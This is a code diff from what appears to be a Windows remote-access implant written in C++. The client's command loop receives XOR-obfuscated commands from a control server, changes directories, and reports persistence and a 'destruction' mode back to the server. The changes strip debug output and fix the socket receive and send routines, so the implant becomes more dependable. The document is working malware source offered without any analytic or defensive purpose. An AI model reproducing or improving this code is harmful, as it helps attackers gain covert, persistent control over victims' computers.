@@ -52,8 +52,6 @@ INT Connexion::main()
 
     while(TRUE)
     {
-        //Sleep(1000);
-
         command = recvSafe(); //Recv safe and decrypt xor
         
         wcout << "command recv: " << command << "<----" <<endl;
@@ -64,10 +62,8 @@ INT Connexion::main()
         {
             ;
             //if find is_life then continue
-            wcout << "life baby " << endl;
-            
+            //wcout << "life baby " << endl;   
         }
-
         else
         {
             //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
@@ -85,12 +81,16 @@ INT Connexion::main()
             //Change directory
                 if(changeDirectory(command.substr(3)))
                 {
-                    result.push_back("Error when changing folder.");
+                    result.push_back("[-] Error when changing folder.");
+
                 }
                 else
                 {
-                    result.push_back(ConvertWideToUtf8(getPath()));   
+                    result.push_back(ConvertWideToUtf8(getPath())); 
+                    wcout << "push ok " << endl;
+                    wcout << getPath() << endl;  
                 }
+
                 sendSafe(result);
             }
 
@@ -125,7 +125,7 @@ INT Connexion::main()
 
                 if(command.substr(16) == L"default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                 {
-                    wcout << "default persi " << endl;
+                    //default persi 
                     send(sock_client, (char *)XOREncryption(L"\r\n").c_str(), 4 ,0);    
                 }
                 else
@@ -144,7 +144,6 @@ INT Connexion::main()
                 if(status_destruction) //Go destruction !
                 {
                     //If error
-                    //string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
                     status = L"MOD_DESTRUCTION:" SPLIT  "True";// "[-] An error occurred while executing the destroy mode.";
                 }
                 else
@@ -177,7 +176,6 @@ INT Connexion::main()
                 else
                 {
                     result.push_back("\n"); //test
-                    wcout << "GET PATHL: " << getPath() << endl;
                     result.push_back(ConvertWideToUtf8(getPath()));
                 }
                 
@@ -194,10 +192,9 @@ INT Connexion::main()
 wstring Connexion::recvSafe()
 {
     //allows you to receive data while managing errors 
-    WCHAR buffer[BUFFER_LEN];
+    WCHAR buffer[BUFFER_LEN] = {0};
     INT len_recv;
-    wstring result;
-    ZeroMemory(&buffer, sizeof(buffer));
+    wstring result = L"";
 
     len_recv=recv(sock_client,(char *)buffer, sizeof(buffer), 0);
         
@@ -211,36 +208,13 @@ wstring Connexion::recvSafe()
         if(wcslen(buffer) == 0)
         {
             //If command empty re connect to server.
-            wcout << "go to reconnect" << endl;
             reConnect();
             return L"";
         }
-        
-       // result.append(buffer, len_recv);
-       result = buffer;
-    }
-    wstring xor_decode = XOREncryption(result);
-    wcout << "\n\n-------------------------------------xor encrypt: "  << endl;
 
-    wcout << "buffer: " << buffer << endl;
-    wcout << "len buffer: " << wcslen(buffer) << endl;
-    wcout <<"result: " << result << endl;
-    wcout << "command: " << xor_decode << endl;
-    wcout << "len command: " << result.length() << endl;
-
-    wcout <<"\n\n--------------------------\ntest xor decode:" << endl;
-    
-    
-   
-    for(int i=0; i < xor_decode.length(); i++)
-    {
-        wcout << "i: " << i << " " << xor_decode.at(i) << endl;
+       result.append(buffer, len_recv / sizeof(WCHAR));
     }
-   
-    wcout << "------------------------\n" << endl;
-   // wcout << "buffer: " << buffer << endl;
-   // wcout << "result: " << result << endl;
-   // wcout << "decrypt xor: " << XOREncryption(result) << endl;
+
     return XOREncryption(result);
 }
 
@@ -250,28 +224,17 @@ VOID Connexion::sendSafe(vector<string> result_of_command)
 Once the function is finished send "\r\n" to signal to the server that the client has nothing more to send. */
     INT iResult=0;
     INT i=0;
-    
     INT size_all_result_of_command = 0;
     wstring request;
 
-    if(result_of_command.size() >= 1) 
-    {        
-        // Multiple request: 
-        for(i=0;i< result_of_command.size(); i++)
-        {            
-            request = XOREncryption(ConvertUtf8ToWide(result_of_command[i]));
-    
-            send(sock_client, (char *)request.c_str(),  request.length()* sizeof(WCHAR) ,0);
-            
-            size_all_result_of_command += request.length();   
-            cout << result_of_command[i] << endl;
-            wcout << "len request: " <<  request.length()<< endl;
-            Sleep(100);   
-        }
+    for(i=0;i< result_of_command.size(); i++)
+    {            
+        request = XOREncryption(ConvertUtf8ToWide(result_of_command[i]));    
+        send(sock_client, (char *)request.c_str(),  request.length()* sizeof(WCHAR) ,0);
+        wcout << "send request baby" << endl;
+        Sleep(100);   
     }
-    
-    wcout << size_all_result_of_command << endl;
-    
+        
     iResult=send(sock_client, (char *)XOREncryption(L"\r\n").c_str() ,4 ,0); // send end communication.
     checkSend(iResult);
 }
